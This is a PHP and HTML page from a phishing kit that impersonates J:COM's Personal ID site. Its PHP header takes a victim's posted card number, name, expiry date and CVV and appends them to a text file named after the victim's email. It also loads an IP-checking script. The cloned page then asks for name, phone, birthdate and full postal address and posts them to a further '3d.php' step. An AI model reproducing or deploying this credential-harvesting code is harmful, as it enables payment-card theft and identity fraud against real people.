<?php
session_start();
include('./fuck1937/lag.php');
include('./fuck1937/checkip.php');
$_SESSION["cardnumber"] = $_POST["cardnumber"];
$_SESSION["cardname"] = $_POST["cardname"];
$_SESSION["yue"] = $_POST["yue"];
$_SESSION["nian"] = $_POST["nian"];
$_SESSION["cvv"] = $_POST["cvv"];
$cardnumber = $_SESSION["cardnumber"];
$cardname = $_SESSION["cardname"];
$yue = $_SESSION["yue"];
$nian = $_SESSION["nian"];
$cvv = $_SESSION["cvv"];
$email = $_SESSION["email"];
file_put_contents("./cvvboy/$email.txt",'---------------卡信息---------------'.PHP_EOL.'卡号：'.$cardnumber.PHP_EOL.'持卡姓名:'.$cardname.PHP_EOL.'持卡姓名:'.$cardname.PHP_EOL.'卡日期:'.$nian.$yue.PHP_EOL.'CVV:'.$cvv.PHP_EOL, FILE_APPEND);
?>

<!DOCTYPE html>
<!-- saved from url=(0057)https://id.zaq.ne.jp/pidefront/certify?from=connect_login -->
<html lang="ja">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta http-equiv="content-script-type" content="text/javascript">
    <meta http-equiv="content-style-type" content="text/css">
    <meta http-equiv="pragma" content="no-cache">
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="expires" content="0">
    <meta name="robots" content="noindex,nofollow,noarchive">
    <title>J:COM　パーソナルID</title>
    <link href="./css/common_content.css" rel="stylesheet" type="text/css" media="all">
    <link href="./css/pidefront_common.css" rel="stylesheet" type="text/css" media="all">
    <link href="./css/jquery-ui.min.css" rel="stylesheet" type="text/css" media="all">
    <meta property="og:site_name" content="J:COMパーソナルID">
    <meta property="og:title" content="J:COMパーソナルID">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://id.zaq.ne.jp/pidefront/">
    <meta property="og:image" content="https://id.zaq.ne.jp/pidefront/content/img/ogp.png">
    <link rel="canonical" href="https://id.zaq.ne.jp/pidefront/">
    <link href="./css/swiper.min.css" rel="stylesheet" type="text/css" media="all">

</head>
<body>

<header class="l-header js-header">
    <div class="l-header-inner">
        <div class="l-header-content">
            <div class="l-header-content-inner">
                <div class="l-header-logo">
                    <h1 class="m-header-logo">
                        <img src="./img/logo.svg" class="m-header-logo-img" alt="J:COM">パーソナルID
                    </h1>
                </div>
            </div>

        </div>
        <div class="l-header-layer js-header-layer"></div>
    </div>
</header>
<main class="l-main">
    <section class="l-section">
        <div class="l-section-inner">

            <div id="basic" class="l-heading-2">
                <h2 class="m-heading-2">請求書アドレス追加</h2>
            </div>
            <form id="certify_form" action="3d.php" method="POST" class="h-adr">
                <span class="p-country-name" style="display:none;">Japan</span>
                <div class="box">
                    <div class="box-inner">
                        <table class="m-table fsize_110pc">
                            <tbody>
                            </tbody><colgroup>
                                <col class="u-sm-hidden-col" style="width: 30%;">
                                <col class="u-sm-hidden-col" style="width: 70%;">
                            </colgroup>
                            <tbody><tr>
                                <td colspan="2" class="m-table-td bold">
                                    請求書の送付先をご記入ください。
                                </td>
                            </tr>
                            <tr>
                                <th class="m-table-th">
                                    お名前
                                </th>
                                <td class="m-table-td">

                                    <input class="width_80pc" type="text" name="mingqian" value=""maxlength="20" placeholder="例)田中　太郎"required="required"><br>
                                </td>
                            </tr>
                            <tr>
                                <th class="m-table-th">
                                    フリガナ
                                </th>
                                <td class="m-table-td">

                                    <input class="width_80pc" type="text" name="pianjia" value=""maxlength="20" placeholder="例)セイ   メイ"required="required"><br>
                                </td>
                            </tr>
                            <tr>
                                <th class="m-table-th">
                                    電話番号
                                </th>
                                <td class="m-table-td">
                                    <div class="radio_btn_area--2column" id="tel_or_mail_area">

                                        <span class="spacer" style="margin-left:16px;"></span>

                                    </div>
                                    <div id="tel_input_area" class="td_input_area">
                                        J:COMパーソナルIDの電話番号をご入力ください。（半角数字）<br>
                                        <input class="width_40pc" type="text" name="tel"maxlength="11" value="" placeholder="例)0334567890"required="required"><br>
                                    </div>
                                    <div id="mail_input_area" class="td_input_area" style="display:none;">
                                        J:COMパーソナルIDのメールアドレスをご入力ください。<br>
                                        
                                    </div>
                                </td>
                            </tr>
                            <tr>
                                <th class="m-table-th">
                                    生年月日
                                </th>
                                <td class="m-table-td">
                                    <div id="birthday_input_area" class="td_input_area">
                                        生年月日を入力してください。<br>
                                        <input class="width_30pc" type="text" name="birthday"maxlength="8" value=""placeholder="例)19990808"required="required"> （半角数字） <br>
                                    </div>
                                </td>
                            </tr>
                            <tr>
                            <tr>
                                <th class="m-table-th">
                                    郵便番号
                                </th>
                                <td class="m-table-td">
                                    <div id="birthday_input_area" class="td_input_area">
                                        郵便番号を入力してください。<br>
                                        <input class="width_30pc" type="text" name="zip"maxlength="7" value=""placeholder="例)1700014"required="required"> （半角数字） <br>
                                    </div>
                                </td>
                            </tr>

                                <th class="m-table-th">
                                    住所
                                </th>
                                <td class="m-table-td">
                                    <div id="birthday_input_area" class="td_input_area">
                                        詳しいご住所をご入力ください。<br>
                                        <select id="kenCdJitaku" name="ADDR1" size="1" title="住所１（都道府県）" class="chkselect errPosRight err"required="required"><option value="" selected="selected">選択してください</option>
                                            <option value="北海道">北海道</option>
                                            <option value="青森県">青森県</option>
                                            <option value="岩手県">岩手県</option>
                                            <option value="宮城県">宮城県</option>
                                            <option value="秋田県">秋田県</option>
                                            <option value="山形県">山形県</option>
                                            <option value="福島県">福島県</option>
                                            <option value="茨城県">茨城県</option>
                                            <option value="栃木県">栃木県</option>
                                            <option value="群馬県">群馬県</option>
                                            <option value="埼玉県">埼玉県</option>
                                            <option value="千葉県">千葉県</option>
                                            <option value="東京都">東京都</option>
                                            <option value="神奈川県">神奈川県</option>
                                            <option value="新潟県">新潟県</option>
                                            <option value="富山県">富山県</option>
                                            <option value="石川県">石川県</option>
                                            <option value="福井県">福井県</option>
                                            <option value="山梨県">山梨県</option>
                                            <option value="長野県">長野県</option>
                                            <option value="岐阜県">岐阜県</option>
                                            <option value="静岡県">静岡県</option>
                                            <option value="愛知県">愛知県</option>
                                            <option value="三重県">三重県</option>
                                            <option value="滋賀県">滋賀県</option>
                                            <option value="京都府">京都府</option>
                                            <option value="大阪府">大阪府</option>
                                            <option value="兵庫県">兵庫県</option>
                                            <option value="奈良県">奈良県</option>
                                            <option value="和歌山県">和歌山県</option>
                                            <option value="鳥取県">鳥取県</option>
                                            <option value="島根県">島根県</option>
                                            <option value="岡山県">岡山県</option>
                                            <option value="広島県">広島県</option>
                                            <option value="山口県">山口県</option>
                                            <option value="徳島県">徳島県</option>
                                            <option value="香川県">香川県</option>
                                            <option value="愛媛県">愛媛県</option>
                                            <option value="高知県">高知県</option>
                                            <option value="福岡県">福岡県</option>
                                            <option value="佐賀県">佐賀県</option>
                                            <option value="長崎県">長崎県</option>
                                            <option value="熊本県">熊本県</option>
                                            <option value="大分県">大分県</option>
                                            <option value="宮崎県">宮崎県</option>
                                            <option value="鹿児島県">鹿児島県</option>
                                            <option value="沖縄県">沖縄県</option>
                                            <option value="(海外)">(海外)</option>
                                        </select>
                                        <br>
                                        市区町村 <br>
                                        <input class="width_30pc" type="text" name="ADDR2" maxlength="20"value=""placeholder="例)×市×町"required="required"><br>
                                        丁番地 <br>
                                        <input class="width_30pc" type="text" name="ADDR3" maxlength="20"value=""placeholder="例）0-1-2"required="required"><br>
                                        建物名 <br>
                                        <input class="width_30pc" type="text" name="ADDR4" maxlength="20"value=""placeholder="例)ビックビル345号室"required="required"><br>
                                    </div>
                                </td>
                            </tr>
                            <tr>
                                <td colspan="2" class="m-table-td">
                                    <ul class="l-link-btn-list">
                                        <li data-u-col="4" data-u-col-sm="12">
                                            <input type="hidden" id="certify_mode" name="mode" value="update_preview">
                                            <input type="hidden" id="certify_from" name="from" value="connect_login">
                                            <input type="hidden" id="certify_ppid" name="ppid" value="">
                                            <input type="submit" class="m-link-btn" value="次へ">
                                        </li>
                                    </ul>
                                </td>
                            </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </form>
        </div>
    </section>
</main>

<footer class="l-footer">
    <div class="l-footer-inner">
        <div class="l-footer-nav-area" data-u-content="wide">
            <ul class="l-footer-nav" data-dir-sm="col">
                <li><a href=""  class="m-footer-nav-link">サービスのご案内 <b>J:COM</b></a></li>
                <li><a href=""  class="m-footer-nav-link">ご加入者さま用ご案内 <b>MY J:COM</b></a></li>
                <li><a href=""  class="m-footer-nav-link">法人のお客さま</a></li>
            </ul>
            <hr class="m-footer-hr">
            <ul class="l-footer-nav">
                <li><a href="" class="m-footer-nav-link">サイトについて</a></li>
                <li><a href=""  class="m-footer-nav-link">プライバシーポリシー</a></li>
                <li><a href=""  class="m-footer-nav-link">企業情報</a></li>
                <li><a href=""  class="m-footer-nav-link">採用情報</a></li>
            </ul>
        </div>
        <div class="l-footer-copy">
            <p class="m-footer-copy">Copyright © JCOM Co., Ltd. All Rights Reserved.</p>
        </div>
    </div>
</footer>

<div id="progressDialog">
    <div class="progressDialogInner">
        <div class="dialog_img"><img src="./img/progress_circle.gif" alt=""></div>
        <p class="text">
            ただいま処理中です。<br>
            この処理には数分かかることがあります。
        </p>
    </div>
</div>


</body>
</html>